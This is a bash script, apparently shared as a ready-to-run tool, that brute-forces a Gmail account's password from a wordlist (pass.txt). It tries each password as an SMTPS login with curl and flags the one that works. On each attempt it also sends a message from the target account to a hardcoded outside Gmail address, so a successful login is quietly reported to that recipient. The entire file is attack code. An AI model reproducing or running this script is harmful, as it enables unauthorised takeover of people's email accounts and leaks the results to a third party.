#!/bin/bash
clear

function setup() {

	touch mail.txt > /dev/null
	echo "working" > mail.txt

	chmod +x *
}
function banner() {

	printf "\e[1;36m    ____                 _ _ ____             _       \e[0m\n"
	printf "\e[1;36m   / ___|_ __ ___   __ _(_) | __ ) _ __ _   _| |_ ___ \e[0m\n"
	printf "\e[1;36m  | |  _| '_ ' _ \ / _' | | |  _ \| '__| | | | __/ _ \ \e[0m\n"
	printf "\e[1;36m  | |_| | | | | | | (_| | | | |_) | |  | |_| | ||  __/\e[0m\n"
	printf "\e[1;36m   \____|_| |_| |_|\__,_|_|_|____/|_|   \__,_|\__\___|\e[0m\n"
	printf "\e[1;37m     GMAIL BRUTE  DEV BY: Naty"
	printf "\n"

}

function checkall() {

	if [ -z "$(command -v curl)" ]; then
		sleep 0.5
		printf "  \e[1;36m[\e[1;37m!\e[1;36m]\e[1;37m CURL PACKAGE NEEDED \e[1;36m!\e[0m \n"
		sleep 0.5
		exit
	fi

	enter
}

function enter() {

	printf "  \e[1;36m[\e[1;37m@\e[1;36m]\e[1;37m ENTER GMAIL ACC\e[1;36m:\e[1;37m "
	read gmail

	check

}

function check() {

	if [ -z "$gmail" ]; then
		sleep 0.5
		printf "  \e[1;36m[\e[1;37m!\e[1;36m]\e[1;37m EMPTY ENTER \e[0m\n"
		sleep 0.5
		printf "\n"
		enter
	fi

	check='^[a-zA-Z0-9]*@gmail.com*$'
	if ! [[ "${gmail,,}" =~ $check ]]; then
		sleep 0.5
		printf "  \e[1;36m[\e[1;37m!\e[1;36m]\e[1;37m INVALID GMAIL \n"
		sleep 0.5
		printf "\n"
		enter
	fi

	start0

}

function start0() {

	sleep 0.5
	printf "  \e[1;36m====================\n"
	sleep 0.5
	printf "\n"
	printf "  \e[1;36m[\e[1;37m@\e[1;36m]\e[1;37m LIST\e[1;36m:\e[1;37m pass.txt\e[0m\n"

	if ! [ -f "pass.txt" ]; then
		sleep 0.5
		printf "  \e[1;36m[\e[1;37m!\e[1;36m]\e[1;37m PASSWORD LIST NOT FOUND \e[1;36m!\e[0m\n"
		sleep 0.5
		exit
	fi

	if [ -z "$(cat pass.txt)" ]; then
		sleep 0.5
		printf "  \e[1;36m[\e[1;37m!\e[1;36m]\e[1;37m EMPTY PASSWORD LIST \e[1;36m!\e[0m\n"
		sleep 0.5
		exit
	fi

	start

}

function start() {

	x=0
	list="$(cat pass.txt | wc -l)"
	while read -r pass; do
		x="$(expr $x + 1)"
		i=7
		while [ "$i" -eq "7" ]; do
			try=$(curl -s --ssl-reqd --url 'smtps://smtp.gmail.com:465' --user "$gmail:$pass" --mail-from "$gmail" --mail-rcpt "yegetanaty03@gmail.com" --upload-file mail.txt)
			i="$?"
		done

		if [ "$i" -eq "67" ]; then
			printf "  \e[1;36m[\e[1;37m@\e[1;36m]\e[1;37m \e[1;36m[\e[1;37m$x\e[1;36m/\e[1;37m$list\e[1;36m]\e[1;37m TRYING $pass \e[1;36m:\e[1;37m FALSE\e[0m         \r"
		elif [ "$i" -eq "0" ]; then
			printf "  \e[1;36m[\e[1;37m@\e[1;36m]\e[1;37m \e[1;36m[\e[1;37m$x\e[1;36m/\e[1;37m$list\e[1;36m]\e[1;37m TRYING $pass \e[1;36m:\e[1;37m TRUE\e[0m          \n"
			sleep 0.5z
			exit
		fi
        done < pass.txt
	echo

}

setup
banner
checkall
